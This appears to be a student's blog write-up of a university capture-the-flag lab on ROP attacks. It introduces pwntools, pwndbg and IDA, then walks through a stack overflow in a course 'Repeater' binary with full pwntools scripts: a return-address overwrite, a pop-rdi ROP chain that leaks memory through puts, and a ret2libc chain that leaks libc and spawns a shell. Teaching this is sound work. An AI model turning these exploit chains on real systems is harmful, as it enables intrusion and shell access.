---
title: 网络破防实践先导实验二————ROP攻击
cover: 'https://s2.loli.net/2022/04/05/2JRfukwTYFL1o6V.jpg'
top_img: 'https://s2.loli.net/2022/04/15/4rMa5KXNHBwvg1k.jpg'
tags: 网络破防实践先导
abbrlink: 7b29b6a8
date: 2022-04-05 00:29:34
---

## 1.前言

终于在熬过了第一个实验之后，来到了老师所说的，比第一个简单一点的实验。然而，事实证明，老师在画大饼: (。第二次实验直接让我们利用二进制漏洞对程序进行攻击，拿到Flag。这有多难呢，这次上课在讲解实验的时候，就有好多人退课了，你没听错，上着上着课就退课了他们。不过抛开难度不谈，这次实验确实很有趣，不仅有种打游戏收集成就的感觉，还学到炒鸡多东西（没错，比上一个实验学到太多太多东西了），所以我很快啊，啪的一下就来写博客记录了。



## 2.实验概览 

这次实验的主题是二进制漏洞，课上，Aidai学长给我们讲解和演示了如何利用二进制漏洞进行ROP。[关于ROP](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/)：

> ROP(Return Oriented Programming)，其主要思想是在**栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。**所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件
>
> 
>
> - 程序存在溢出，并且可以控制返回地址。
>
> - 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。
>
>   
>
> 如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。



学长主要介绍了**ret2text **和 **ret2libc **两种类型的攻击手段。这次我们攻击的目标是一个Reperter程序。

## 3.实验介绍

### 0)基础介绍

在开始讲实验操作之前，先讲点基础知识：

#### Pwntools

> - pwntools是一个CTF框架和漏洞利用开发库 
> - 用Python开发，旨在让使用者简单快速的编写exploit。 
> - 文档：https://docs.pwntools.com/en/latest/



这是一个很好用的CTF工具，推荐使用Python2.X版本，会体验比较好。

##### **安装方法**

直接使用pip安装：

`pip install pwntools`



##### 使用Pwntools

pwn是一个为CTF优化的工具箱，使用时在脚里直接引入整个包

`from pwn import *`

此外，还有一个pwnlib模块，这也是一个标准的python模块，使用时需要单独import，如`import pwnlib.shellcraft`



常见的一些语句：

``` python
from pwn import *

p = process("./pwn")  # 本地process与程序交互
r = remote("XX.XX.XX.XX","10104") # 远程，两个参数分别是IP和端口

# 库信息
e = ELF("./pwn")
# ELF载入当前程序的ELF，以获取符号表，代码段，段地址，plt，got信息
libc = ELF("./libc-2.31.so")
# 载入libc的库，可以通过vmmap查看

# 首先使用ELF()获取文件的句柄，然后使用这个句柄调用函数，如
e = ELF('/bin/cat')
print(hex(e.address))   # 文件装载的基地址
print(hex(e.symbols['write']))  # plt表中write函数地址
print(hex(e.got["write"]))  # GOT表中write符号的地址
print(hex(e.plt["write"]))  # PLT表中write符号的地址
```

关于GOT表和PLT表，简单来说，这两个表是为了程序能够动态链接到外部函数所使用的。存放函数地址的数据表，称为**重局偏移表**（GOT, Global Offset Table），而那个额外代码段表，称为**程序链接表**（PLT，Procedure Link Table）。

简单来说，GOT表里存的时函数的地址，PLT表存放调用函数的代码，下图的例子比较直观的告诉我们GOT表和PLT表

![PLT和GOT原理雏形](https://s2.loli.net/2022/04/05/eqKatAD8vZSldIk.jpg)

解释一下，就是当你的程序需要调用外部函数（比如这里的printf和write）时，首先需要先去PLT表里，找到相应的函数代码，然后跳转到相对应的函数的地址，最后在外部库glibc里找到printf和wirte的汇编代码，你的程序才可以执行printf和write。接下来是交互的一些语句：

###### 1）接收：

```python
# 接收
r = remote("exploime.example.com",3333)
r.recv()          # 接收数据，一直接收
r.recvuntil("111")
# 接收到111结束，可以裁剪，如.[1:4]
r.recvline()   	# 接收到换行结束
r.recvline(n)	     # 接收到n个换行结束
r.recvall()		# 接收到EOF
r.recvrepeat(timeout=default) # 接收到EOF或timeout
```



###### 2）发送：

```python
r = remote("exploime.example.com",3333)
r.send(data)    # 发送数据
r.sendline(data) # 发送一行数据，在末尾回家\n
r.sendlineafter(delims,data)
# 程序接收到delims再发送data
r.send(asm(shellcraft.sh()))

# 交互模式，一般写在最后，在拿到服务器的shell之后进行的函数
r.interactive()
```



###### 3）字符串与地址的转换

```python
p64(),p32() # 将字符串转化为ascii字节流
u64(),u32() # 将ascii的字节流解包为字符串地址
```

p64和u64都是对64位程序使用的，需要8-byte的数据一次，而p32和u32需要4-byte数据一次。p64作用：因为python中的地址，虽然是16进制，但是要想被程序读取成地址，就得将地址转换位ascii字节流，像下边这样：

```python
# 打包
ret = 0x40140A # 十六进制的地址
print(p64(ret)) 
# -> b'\n\x14@\x00\x00\x00\x00\x00'

# 解包
data = b'\n\x14@\x00\x00\x00\x00\x00'
print(hex(u64(data)))
# -> 0x40140a

```

除了Pwntools外，还有一个个人开发的zio，也是一个CTF框架

#### 使用GDB

##### 关于GDB

> UNIX及UNIX-like下的[调试工具](https://baike.baidu.com/item/调试工具/53352344)。或许，各位比较喜欢那种图形界面方式的，像VC、BCB等IDE的调试，但如果你是在 UNIX平台下做软件，你会发现GDB这个调试工具相比于VC、z的优点是具有修复网络断点以及恢复链接等功能，比BCB的图形化调试器有更强大的功能。所谓“尺有所短，寸有所长”就是这个道理。

GDB是GNU开源组织发布的一个强大的Linux下的

程序调试工具，其可以下断点、查看程序内存等，安装方式：

` sudo apt install gdb`

因为原始的GDB界面对调试不太友好，所以我们需要装一个插件——**pwndbg**

pwngdb是一个GDB的插件，可以让界面更加美观，更容易上手

项目地址：https://github.com/pwndbg/pwndbg

安装方式：

```shell
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

##### GDB的使用

###### **1）断点**

- b+函数名（符号）
- b + *地址
- del + 断点id
- del 删除所有断点
- info b 查看所有断断点

```shell
pwndbg> b main
Breakpoint 1 at 0x40140b

pwndbg> b *0x401409
Breakpoint 4 at 0x401409

pwndbg> info b
Num     Type           Disp Enb Address            What
3       breakpoint     keep y   0x000000000040140b <main>
4       breakpoint     keep y   0x0000000000401409 <vuln+214>

```



###### **2）运行**

-  file + 程序名 加载程序
-  或者直接在 shell 里面 gdb + 程序名
-  run / r      运行程序
-  c     continue继续执行程序
-  gdb attach PID   通过进程号调试程序

```shell
gdb pwn  #调试pwn程序

ps -ef | grep pwn  #查看pwn程序的进程
# hnx123     13906   13902  0 04:45 ?        00:00:00 [pwn] <defunct>

gdb attach 13906   #通过进程号附着在程序上
```



###### **3）程序跟进**

- s / n 分别对应 step into 和 step over，需要在有调试信息的情况下使用
- si / ni 汇编级的 step into 和 step over。



###### **4）查看内存**

- p *数据地址
- x + 地址
- p + $寄存器



```shell
pwndbg> p *0x7ffc054e88f0
 $3 = 32

pwndbg> x 0x7ffc054e88f0   
 0x7ffc054e88f0:	0x00000020

pwndbg> p $rsp   #查看寄存器
 $6 = (void *) 0x7ffc054e88e8

```



###### **5）pwndbg扩展**

- stack / stack + n 查看栈 / 查看 n 项栈内容
- telescope + 地址  查看某段地址的附近

```shell
pwndbg> stack 5   # 查看栈顶5条数据
 00:0000│ rsp 0x7ffc054e88e8 —▸ 0x7fd8aff67bcf ◂— test   rax, rax
 01:0008│     0x7ffc054e88f0 ◂— 0x20 /* ' ' */
 02:0010│     0x7ffc054e88f8 ◂— 0x8
 03:0018│     0x7ffc054e8900 ◂— 0x46474e550
 04:0020│     0x7ffc054e8908 —▸ 0x7fd8b00c3980 ◂— 0xfbad208b


pwndbg> telescope 0x401409
 00:0000│  0x401409 ◂— leave  
 01:0008│  0x401411 ◂— mov    ebp, esp
 02:0010│  0x401419 ◂— add    byte ptr [rax - 0x75], cl
 03:0018│  0x401421 ◂— mov    ecx, 0
 04:0020│  0x401429 ◂— add    byte ptr [rax], al
 05:0028│  0x401431 ◂— mov    edi, eax
 06:0030│  0x401439 ◂— mov    eax, dword ptr [rip + 0x2c61]
 07:0038│  0x401441 ◂— add    byte ptr [rax], al
```

![](https://s2.loli.net/2022/04/05/COdgu3RscWBUHyo.png)

#### 使用IDA

##### 关于IDA

![](https://s2.loli.net/2022/04/05/jOQfZXLyipHDFtN.png)

> 交互式反汇编器专业版（Interactive Disassembler Professional），人们常称其为IDA Pro，或简称为IDA。是最棒的一个静态反编译软件，为众多[0day](https://baike.baidu.com/item/0day/4885829)世界的成员和[ShellCode](https://baike.baidu.com/item/ShellCode)安全分析人士不可缺少的利器！IDA Pro是一款交互式的，可编程的，可扩展的，多处理器的，交叉Windows或[Linux](https://baike.baidu.com/item/Linux) [WinCE](https://baike.baidu.com/item/WinCE) [MacOS](https://baike.baidu.com/item/MacOS)平台主机来分析程序， 被公认为最好的花钱可以买到的[逆向工程](https://baike.baidu.com/item/逆向工程/5097433)利器。IDA Pro已经成为事实上的分析敌意代码的标准并让其自身迅速成为攻击研究领域的重要工具。它支持数十种CPU指令集其中包括[Intel x86](https://baike.baidu.com/item/Intel x86)，[x64](https://baike.baidu.com/item/x64/8161446)，[MIPS](https://baike.baidu.com/item/MIPS/2173143)，[PowerPC](https://baike.baidu.com/item/PowerPC)，[ARM](https://baike.baidu.com/item/ARM/7518299)，[Z80](https://baike.baidu.com/item/Z80)，[68000](https://baike.baidu.com/item/68000/1255747)，c8051等等。

这是一个Windows下非常好用的反汇编软件，功能非常强大



![](https://s2.loli.net/2022/04/05/25hd4yMiGT7kc3X.png)

![](https://s2.loli.net/2022/04/05/FYpcI51i6vWOLbX.png)
在加载出汇编代码后，按下F5就可以看到又汇编代码生成的伪代码：

![](https://s2.loli.net/2022/04/05/12nRigUsMPTZ4NY.png)

通过IDA分析，可以很容易可以分析出各种函数的地址，还有内存中的一些地址，非常滴有用



铺垫了这么多，终于可以开始讲第一个程序Repeater了。



### 1) Repeater

我在这里主要介绍对Repeater程序的攻击：

首先，这个程序的功能就是发送给你一个4位数字，然后你需要将这个数字发送回去给程序，程序就会发送给你一个新的4位数字，然后就一直循环下去了......效果如下图所示：

![](https://s2.loli.net/2022/04/05/AqnWdNpIsV3LmFM.png)

如果你不按要求来重复数字的话，嘿嘿，那你就 不是一个Repeater！！！

![](https://s2.loli.net/2022/04/05/MFzkOmXrsqGLlph.png)

就是这么一个功能简单的程序，里面放了五个Flag（Flag相当于游戏里面的成就，拿到就会得到相应的分数，还有大大滴成就感XD），下面列举这五个Flag的达成条件：

- **Flag1**：重复一百次可取得；
- **Flag2**：调用gift函数可取得；
- **Flag3**：输入10423进入里世界后，输入负数或超大数可取得；
- **Flag4**：泄漏出puts地址后，打印变量储存Flag4的变量可取得；
- **Flag5**：拿到shell后，查看服务器目录可取得；



对于Flag1，重复一百次即可，当然，不可能手动了，用pwntools写个脚本来自动执行就好了，Flag1:

![](https://s2.loli.net/2022/04/05/ChZeQ4O8oq5itwb.png)

接下来的**Flag2**就开始有难度了，要通过调用gift函数才可以拿到旗子。通过分析程序可以发现，在重复的时候输入10423可以进入里世界（一个彩蛋界面）

![](https://s2.loli.net/2022/04/05/qsAlN2kCvxVctpD.png)

在这个Input size里，可以使用了scanf函数，存在着栈溢出漏洞，通过利用漏洞可以覆盖返回地址进行ROP。

![](https://s2.loli.net/2022/04/05/LhGjdSCrxKUIla8.png)

通过分析scanf输入的变量可知，v3存在距离rbp（栈底）偏移8个字节的地方，也就是说只要把着8个字节覆盖掉，再覆盖掉一个old rbp（也是8个字节），就能覆盖返回地址了，这样一来就能劫持控制流了。然而理想很美好，现实很骨感，单单覆盖掉8+8个字节并不能成功，这和学长上课时候演示的不一样。因此只能通过GDB打断点调试，看看是那里出了问题，我选择在函数的ret之前打个断点看看栈的填充情况，一看，果然是没填充满栈帧，

![](https://s2.loli.net/2022/04/05/TftjcHdZoxSMQYu.png)

观察栈帧和寄存器的值，不停的增加填充量，最后终于填充成功了，变成了31+8（我也不知道为啥是31+8），最后成功覆盖了返回地址，使其跳转到了gift函数的地址

![](https://s2.loli.net/2022/04/05/XPYHuZvtD9asMdz.png)

最后成功的拿到Flag2了呢

![](https://s2.loli.net/2022/04/05/3iZFLwCWRou2xzg.png)

Flag2代码：

```python
from pwn import *

e = ELF("./pwn")
print(hex(e.address))
p = process("./pwn")

code = '10423'

for i in range(4):
	print(p.recvline())	
p.sendline(code.encode())
print(p.recvline())
print(p.recvline())


f = b'a'*0x31 + b'b'*0x8 + p64(0x4012b6)   #填充量31+8


p.sendline(f)

print(p.recvline())
print(p.recvline())
print(p.recvline())
```



拿到Flag2之后，Flag3就很容易了，只要满足以下条件就能拿到了

![](https://s2.loli.net/2022/04/05/XAGhVtk6CWQxiHn.png)

即找到一个数，是之不大于16，同时又大于0x10就可以了，因为第一个判断是把无符号整型转换为了普通整型，所以当你输入一个负数的时候，负数会小于第一个16，而第二个判断还是无符号整型，所以该整型会变成一个非常大的数。然后既可以拿到Flag3啦

![](https://s2.loli.net/2022/04/05/9ifHF7leTxKC18A.png)

Flag4的话，又要用到一点新手段了，因为程序里没有直接的代码可以输出Flag4，所以需要我们自己构造ROP链来输出Flag4

因为函数中使用了puts函数，所以在程序的plt表中会有调用puts函数的代码，然后，再使用**ROPgadget**来找一段小代码片段，

`pop ret rdi`

有了这个片段之后，就可以把想要输出的数据存进RDI寄存器中并压入栈中，并被puts输出。

首先先找一下小片段代码的地址

![](https://s2.loli.net/2022/04/05/bBrwV91pyLd6tFZ.png)

可以看到，程序中确实有这一段代码可以用，然后，按照函数调用的方式，构造ROP链

Flag4代码如下：

```python
from pwn import *
import time

e = ELF("./pwn")
print(hex(e.address))
p = process("./pwn")

code = '10423'

for i in range(4):
	print(p.recvline())
	
p.sendline(code.encode())


print(p.recvline())
print(p.recvline())


pop_rdi = 0x00000000004016a3   #找到的符合条件的一小段代码片段
target = 0x4040E0    #Flag4的变量地址

f = b'a'*0x31 + b'b'*0x8 + p64(pop_rdi) + p64(target) + p64(e.plt['puts'])
#根据函数调用的方式构造的ROP链，相当于执行函数puts(flag4)

p.sendline(f)

print(p.recvline())
print(p.recvline())






```

拿到Flag4力：

![](https://s2.loli.net/2022/04/05/yFw3P6lS9jqCizh.png)

最后一个Flag5，要用到ret2libc，非常的麻烦（当然是对我这种菜鸡来说: (。），简单说一下什么是ret2libc，原理：

> ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system("/bin/sh")，故而此时我们需要知道 system 函数的地址。

在这个程序中，我们可以通过调用动态链接库`libc.so`里面里面的`system`函数和`/bin/sh`字符串，构造出`system("/bin/sh")`就可以拿到Shell了，那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点

- system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。
- 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下
- https://github.com/niklasb/libc-database

所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。

那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。**当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。**这里我选择之前的puts函数，使用其泄露的地址即可。此外， 在libc 中也是有 `/bin/sh` 字符串的，所以我们可以一起获得 `/bin/sh `字符串的地址。

Flag5的代码如下：

```python
from pwn import *


e = ELF("./pwn")
libc = ELF("./libc-2.31.so")   # 本次实验提供了与服务器端相同的libc库，
print(hex(e.address))
p = process("./pwn")
code = '10423'

for i in range(4):
	print(p.recvline())
	
p.sendline(code.encode())


print(p.recvline())
print(p.recvline())


pop_rdi = 0x00000000004016a3
target = 0x4040E0

ret = 0x40140A


payload = b'a'*0x31 + b'x'*0x8 + p64(pop_rdi) + p64(e.got['puts']) + p64(e.plt['puts']) + p64(0x401333)
# 泄露puts函数地址，相当于puts(got.puts)

p.sendline(payload)


libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00')) - libc.symbols['puts']
# 使用泄露出来的地址减去libc中对应的地址，得到基地址
system = libc_base + libc.symbols['system']
# 构造system函数的地址
for i in libc.search(b'/bin/sh'):
	binsh = i
	
binsh = libc_base + binsh
# 构造/bin/sh字符串的地址

payload = b'c'*0x38   #填充量，不知为啥，这次填充比第一次多了7个字节，明明是一样的函数
payload += p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)


print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())

p.sendline(payload)

p.interactive()
```

通过这种比较厉害的手段，就可以拿到服务器的shell了，Flag全家福如下：

![](https://s2.loli.net/2022/04/06/OBYjdFscGNmEzgK.png)

终于Repeater全成就了，呜呜呜，好有成就感。



### 2）QDOJ

### 3) C4

## 3.实验总结

